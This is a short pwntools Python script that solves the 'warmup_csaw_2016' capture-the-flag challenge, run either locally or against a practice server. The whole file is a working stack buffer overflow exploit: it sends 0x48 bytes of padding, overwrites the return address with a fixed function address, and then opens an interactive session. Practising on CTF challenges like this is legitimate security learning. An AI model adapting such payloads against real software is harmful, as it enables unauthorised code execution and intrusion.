import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'

if len(sys.argv)==1 :
	io=process('warmup_csaw_2016')
	#elf=ELF('')
	#libc=ELF('')
else :
	io=remote('f.buuoj.cn',20035)
	#elf=ELF('')
	#libc=ELF('')

pay='a'*0x48+p64(0x40060d)
io.recv()
io.sendline(pay)


#gdb.attach(io)
#pause()
io.interactive()